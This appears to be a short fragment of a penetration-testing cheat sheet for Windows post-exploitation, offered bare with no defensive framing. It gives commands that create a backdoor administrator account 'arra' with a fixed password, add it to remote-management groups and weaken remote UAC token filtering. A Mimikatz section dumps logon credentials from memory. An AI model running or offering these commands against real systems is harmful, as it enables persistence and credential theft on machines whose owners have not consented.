```bash
net localgroup administrators arra /add

net localgroup "Remote Management Users" arra /add

net user arra Password1! /add

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```


## MIMIKATZ

```bash
mimikatz # privilege::debug
Privilege '20' OK
 
mimikatz # sekurlsa::logonpasswords
```
